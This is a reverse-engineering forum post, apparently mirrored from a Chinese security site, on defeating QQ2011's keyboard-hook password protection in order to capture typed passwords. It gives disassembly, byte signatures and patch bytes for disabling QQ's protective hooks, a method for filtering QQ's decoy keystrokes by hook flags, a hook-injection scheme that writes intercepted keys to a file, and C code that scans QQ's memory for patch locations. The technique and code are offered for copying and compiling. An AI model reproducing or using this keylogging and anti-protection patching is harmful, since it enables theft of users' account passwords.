@@ -1,0 +1,249 @@
+
+# QQ2011 低级键盘钩子分析----ring3 截获 QQ 密码
+
+> 原文：[`www.pediy.com/kssd/pediy12/133943.html`](https://www.pediy.com/kssd/pediy12/133943.html)
+
+QQ2011 低级键盘钩子分析
+
+```
+004DF8B1    55               PUSH EBP  
+004DF8B2    8BEC             MOV EBP,ESP  
+004DF8B4    81EC 98000000    SUB ESP,98  
+004DF8BA    C745 FC E8F24D0>MOV DWORD PTR SS:[EBP-4],4DF2E8  
+004DF8C1    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]  
+004DF8C4    8B4A 3C          MOV ECX,DWORD PTR DS:[EDX+3C]  
+004DF8C7    8B01             MOV EAX,DWORD PTR DS:[ECX]  
+004DF8C9    3C CC            CMP AL,0CC  
+004DF8CB    75 07            JNZ SHORT 004DF8D4  
+004DF8CD    C742 08 0100000>MOV DWORD PTR DS:[EDX+8],1  
+004DF8D4    B8 FF441A6A      MOV EAX,6A1A44FF  
+004DF8D9    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]  
+004DF8DC    81C2 0A060000    ADD EDX,60A  
+004DF8E2    B9 27000000      MOV ECX,27  
+004DF8E7    8D148A           LEA EDX,DWORD PTR DS:[EDX+ECX*4]  
+004DF8EA    83EA 04          SUB EDX,4  
+004DF8ED    0302             ADD EAX,DWORD PTR DS:[EDX]  
+004DF8EF    49               DEC ECX  
+004DF8F0   75 F8             JNZ SHORT 004DF8EA  
+004DF8F2    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]  
+004DF8F5    0142 08          ADD DWORD PTR DS:[EDX+8],EAX  
+004DF8F8    C785 68FFFFFF 9>MOV DWORD PTR SS:[EBP-98],94  
+004DF902    8D85 68FFFFFF    LEA EAX,DWORD PTR SS:[EBP-98]  
+004DF908    50               PUSH EAX  
+004DF909    8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]  
+004DF90C    FF51 30          CALL DWORD PTR DS:[ECX+30]  
+004DF90F    83BD 78FFFFFF 0>CMP DWORD PTR SS:[EBP-88],2  
+004DF916    75 70            JNZ SHORT 004DF988  
+004DF918    6A 00            PUSH 0  
+004DF91A    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]  
+004DF91D    FF52 28          CALL DWORD PTR DS:[EDX+28]  
+004DF920    6A 00            PUSH 0  
+004DF922    50               PUSH EAX  
+004DF923    8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]  
+004DF926    8B51 64          MOV EDX,DWORD PTR DS:[ECX+64]  
+004DF929    52               PUSH EDX  
+004DF92A    6A 0D            PUSH 0D  
+004DF92C    8B45 FC          MOV EAX,DWORD PTR SS:[EBP-4]  
+004DF92F    FF50 3C          CALL DWORD PTR DS:[EAX+3C]          ; 安装 WH_KEYBOARD_LL 钩子  
+004DF932    8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]  
+004DF935    8941 14          MOV DWORD PTR DS:[ECX+14],EAX  
+004DF938    8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]  
+004DF93B    8379 14 00       CMP DWORD PTR DS:[ECX+14],0  
+004DF93F    EB 47            JE SHORT 004DF988          ;改为 jmp 后可以眺过安装 WH_DEBUG 钩子  
+004DF941    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]          ; 以后安装 WH_DEBUG 钩子  
+004DF944    FF52 34          CALL DWORD PTR DS:[EDX+34]  
+004DF947    50               PUSH EAX  
+004DF948    6A 00            PUSH 0  
+004DF94A    8B45 FC          MOV EAX,DWORD PTR SS:[EBP-4]  
+004DF94D    8B48 60          MOV ECX,DWORD PTR DS:[EAX+60]  
+004DF950    51               PUSH ECX  
+004DF951    6A 09            PUSH 9  
+004DF953    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]  
+004DF956    FF52 3C          CALL DWORD PTR DS:[EDX+3C]  
+004DF959    8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]  
+004DF95C    8941 10          MOV DWORD PTR DS:[ECX+10],EAX  
+004DF95F    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]  
+004DF962    837A 10 00       CMP DWORD PTR DS:[EDX+10],0  
+004DF966    75 19            JNZ SHORT 004DF981  
+004DF968    8B45 FC          MOV EAX,DWORD PTR SS:[EBP-4]  
+004DF96B    8B48 14          MOV ECX,DWORD PTR DS:[EAX+14]  
+004DF96E    51               PUSH ECX  
+004DF96F    8B55 FC          MOV EDX,DWORD PTR SS:[EBP-4]  
+004DF972    FF52 40          CALL DWORD PTR DS:[EDX+40]  
+004DF975    8B45 FC          MOV EAX,DWORD PTR SS:[EBP-4]  
+004DF978    C740 14 0000000>MOV DWORD PTR DS:[EAX+14],0  
+004DF97F    EB 07            JMP SHORT 004DF988  
+004DF981    B8 01000000      MOV EAX,1  
+004DF986    EB 02            JMP SHORT 004DF98A  
+004DF988    33C0             XOR EAX,EAX  
+004DF98A    8BE5             MOV ESP,EBP  
+004DF98C    5D               POP EBP  
+004DF98D    C3               RETN  
+```
+
+特征码：
+
+```
+004DF932    8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]  
+004DF935    8941 14          MOV DWORD PTR DS:[ECX+14],EAX  
+004DF938    8B4D FC          MOV ECX,DWORD PTR SS:[EBP-4]  
+```
+
+`base: 8B 4D FC 89 41 14 8B 4D FC xx xx xx xx`
+
+`+13: 要修改的指令(2 个字节)`
+
+实验证明找到的特征代码有两处，低地址为执行的代码，高地址的为备份代码，
+
+当程序检测到执行代码改变时，用备份代码恢复之。所以修改时，应先将备份代码修改，然后再修改可执行代码，这样安全些.
+
+`keyoard_ll hook proc 特征码`
+
+```
+003CF513    B9 07000000      MOV ECX,7  
+003CF518    33C0             XOR EAX,EAX  
+003CF51A    FC               CLD  
+```
+
+特征码
+
+`base: B9 07 00 00 00 33 C0 FC`
+
+`-12: 回调函数头地址`
+
+`MOV ECX,7`
+
+`XOR EAX,EAX`
+
+`CLD`
+
+分析过程：
+
+@首先通过工具软件（XueTr)找到 QQ 安装的硬件钩子句柄和回调函数地址，用 CE 定位该句柄地址  
+结果发现，当光标放入密码框后，句柄的值不断变化，而工具软件的显示也支持这个结论。然而，回调函数的基址确没有发生变化。这说明 QQ 为了保持自己的硬件键盘钩子保持在最前边，除了应用 `WH_DEBUG` 钩子外，还在不断地给自己安装（卸载）键盘硬件钩子
+
+@用 OD 在 CE 找到的存放键盘硬件钩子句柄的内存地址下内存写入的硬件断点，经调试，主要在两个地方断下，一个为给该地址赋值 0，一个为赋值为非零（一个 call 的返回值），很显然，这是函数得到的钩子句柄值了。这两段代码会在输入焦点在密码框后不断被反复执行的。
+
+@调试发现 QQ 的可执行代码大部分放在了数据段（也有的可能在堆栈里），这些区域非常灵活，程序不断刷新这些区域，最终导致 OD 的断点失灵，断不不来。处理的方法这里有一种，比较烦，就是结合 CE，将相应下断点的地址处的内存锁定，值保持为 `0xcc` (`int 3`) 这样，CE 配合 OD 就可以正常下断了。
+
+@用前边的方法可以定位到 QQ 安装钩子的函数处，虽然每次 QQ 启动，这些函数的地址是不相同的，但代码的特征没有发生变化，我们可以用暴力搜索特征码（不知道 CE 用的什么方法搜索的那么快，高手指点一下。我的搜索算法效率太低！）的方法定位这些函数包括钩子安装的函数以及相应的钩子回调函数。定位函数基址以后，就可以用写入内存的方法来修改相应代码。注意有些代码是不断被 QQ 更新修正的。我这里有两个思路，一个是通过系统调用更改相应页面的保护属性，使其在我们写入数据后变为只读的页面。别一个时找到 QQ 的备份代码位置，本人运气不错，无意间在搜索内存的过程中发现了，这样的备份代码在内存里确实存在。也就是说，只要备份代码被我们改变，那么实际执行的代码即使我们不动，它也会被 QQ 更新为我们需要的。
+
+@`0x90` 确实是个好东西，它可以让程序的好多调用失效。我们可以在 QQ 安装钩子的函数附近 `nop` 一些代码，这样其安装钩子就会失败。然而并不是我们就解决了所有问题，它自己安不上钩子，密码也就没法接收了。我们无法输入密码了。原因是它通过自己的硬件钩子获取用户输入的密码，而不是常规的消息循环机制。我们必须解决这个问题。当我们给 QQ 打上内存补丁后，给它安装个钩子也不是什么难事了。我一开始想到的便是安装 `WH_KEYBOARD_LL` 钩子，开始实验时安装在系统范围内，结果别处的击键操作可以正常钩到，但 QQ 的密码框确不秆，钩到的信息除了有我们键入的以外还有好多乱码按键（这时 QQ 显然不会给加密，因为此时钩子是我们的在最前边，也因而我们能找到自己按的键，如果不打内存补丁，则经 QQ 的钩子函数处理后，我们得到的真的就全是乱码了！）。我分析，QQ 应该采用了模拟按键一类的方法，那些不是我们按下键的信息自然是它做的干扰。怎么解决？试想，假如钩子是 QQ 安的，它的回调函数怎么做？它自然可以区分正常按键和自己的干扰按键。在键盘硬件钩子的回调函数里有 `KBDLLHOOKSTRUCT` 结构。其中的虚拟码，扫描码按一般的认识，其不会被利用。不然会影响正常按键的判别。最大的可能就是那个 flags 成员以及那个附加信息域了。我采集了一些相关的数据，结果让人心喜。flags 成员出现情况了。正常按键取值为 `0x00`(按下）和 `0x80`(释放），而那些乱码按键则为 `0x10` 或 `0x90`，这样一来，我们便可以非常容易的过虑了。利用一些函数，我们能够很容易的得到相应键的 ascii 码。然而我们这时还是没有办法输入密码。想正常输入密码还得另想办法。
+
+@起始时认为 `WH_KEYBOARD_LL` 钩子子是安装在系统每个进程里的，然而实验失败了。查 MSDN 得知该钩子用本地线程环境执行回调函数，系统通过给本地程序发消息来实现钩子回调函数的调用。所以想通过这种类型的钩子访问目标进程内部的数据（原始回调函数）已经是不可能的了。我们不能直接安装这个钩子。
+
+@首先肯定一点，如果我们想调用原始的回调函数，我们必须注入它的进程里。`WH_KEYBOARD_LL` 是无法注入到其进程里的。为了达到这个目的，我们不妨用 `WH_KEYBOARD` 安装远线程钩子，这样我们就成功注入了安装这个钩子时需要传入原始回调函数地址（线程 Id 号就不说了）。这样我们可以在该钩子的注册回调函数（`WH_KEYBOARD` 的）安装 `WH_KEYBOARD_LL`，这时钩子就被安装在 QQ 的进程空间里了。如果我们在注册的回调函数里直接调用原始回调函数，结果证明一切正常。试想，我们多些代码，设置一些过滤什么的又如何呢？我的注册函数名称为 `Filter!` 实现将拦到的按键写到文件里。呵呵！用心良苦呀！
+
+@通过对 QQ 的分析，我们应该深入了解钩子的工作机制，动态库的相关知识，一些相应的调试和反调试技术 等。
+
+附加说明：附件中有源代码，vc2005 可直接编译。一个项目为 dll，一个为测试程序。特征码在我的机器上目前仍有效，win7+qq2011 最新版本。当然，关键还是我们解决问题的思路。代码可以任意复制和修改。有问题希望一起讨论下。
+
+vista,win7 系统上程序要以管理员权限运行。由于特征码搜索算法效率不高，点击 `button1` 后，等待的时间稍长些.
+
+搜索算法已经修正，附件被更新。2011/05/15 17:50
+
+上传的附件
+
+| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || `kill QQ2011.rar`  
+|
+
+哈哈，改进成功了。就是一次读一页的内存，然后再匹配。用不到一秒的时间就可以找到两处特征码了。谢谢 7 楼的帮助。
+
+```
+BYTE    CharacterCode[ 9 ] = {0x8B,0x4D,0xFC,0x89,0x41,0x14,0x8B,0x4D,0xfc};//locate the set hook call  
+BYTE    CharacterCode2[8 ] = {0xB9,0x7,0,0,0,0x33,0xC0,0xFC};  
+BYTE    code[ 2 ] = { 0xeb,0x47 };  
+BYTE    code2[ 18 ] = {0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x33,0xc0};  
+BYTE        buffer[ 4096 ];  
+
+void Patch( HANDLE hProcess )  
+{  
+  BYTE  mem[ 9 ]={0},*p,*p1,*base,*addr1,*addr2,*q_hook_proc;  
+  DWORD  retBytes;
+```
+
+
+
+```c
+  int i,flag;  
+
+  MEMORY_BASIC_INFORMATION  mem_info;  
+
+  flag = 0;  
+
+  for( base = NULL;(DWORD)base <=0x1fff000;base+=0x1000 )  
+
+  {  
+
+    VirtualQueryEx( hProcess,base,&mem_info,sizeof( mem_info ) );  
+
+    while( mem_info.State != MEM_COMMIT ||  
+             //mem_info.State != MEM_RESERVE ||  
+             mem_info.Type == MEM_IMAGE ||  
+             mem_info.Type == MEM_MAPPED ||  
+             (mem_info.Protect != PAGE_EXECUTE_READWRITE && mem_info.Protect != PAGE_READWRITE) )  
+
+    {  
+
+      base = /*(DWORD)mem_info.BaseAddress*/base+(DWORD)mem_info.RegionSize;  
+
+      if( base > 0x1ffffff )return;  
+
+      VirtualQueryEx( hProcess,base,&mem_info,sizeof( mem_info ) );  
+
+    }    
+    
+    //printf("\\n%x %x",base,mem_info.RegionSize );  
+
+    for( p = base;(DWORD)p < (DWORD)base + mem_info.RegionSize;p+=4096)  
+        {  
+            if( !ReadProcessMemory( hProcess,p,buffer,4096,&retBytes ))  
+        continue;  
+            for( i = 0;i < 4096-8;i++)  
+            {  
+              if( memcmp( &buffer[i],CharacterCode2,8 ) == 0 )  
+                {  
+                q_hook_proc = p + i - 0x12;  
+                printf("\\nhookproc:%x\\n",q_hook_proc );  
+              }  
+                }  
+            for( i = 0;i < 4096 - 9;i++)  
+            {  
+              if( memcmp( &buffer[i],CharacterCode,9 ) == 0 )  
+                {  
+                printf("%x ",p+i );  
+                if( flag == 0 ){  
+                  addr1 = p+i;  
+                  flag++;  
+                  continue;  
+                }  
+                if( flag == 1 ){  
+                  addr2 = p+i;  
+                  flag++;  
+                  break;  
+                }  
+              }  
+            }  
+    }  
+    if( flag == 2 )break;  
+
+    base = p-0x1000;  
+
+  }  
+
+  //这里为了验证特征码，暂时不修改内存。  
+
+  /*  
+  WriteProcessMemory( hProcess,(DWORD)addr2 + 13,code,2,NULL );  
+
+  WriteProcessMemory( hProcess,(DWORD)addr2 - 18,code2,18,NULL );  
+
+  WriteProcessMemory( hProcess,(DWORD)addr1 + 13,code,2,NULL );  
+
+  WriteProcessMemory( hProcess,(DWORD)addr1 - 18,code2,18,NULL );  
+
+  */  
+}  
+```
+
+至于思路的问题，大家好好看下代码，再结合上边的简略描述，我想理解起来应该不是太困难了。把代码中的`patch`函数改进之后，效率就更高了……
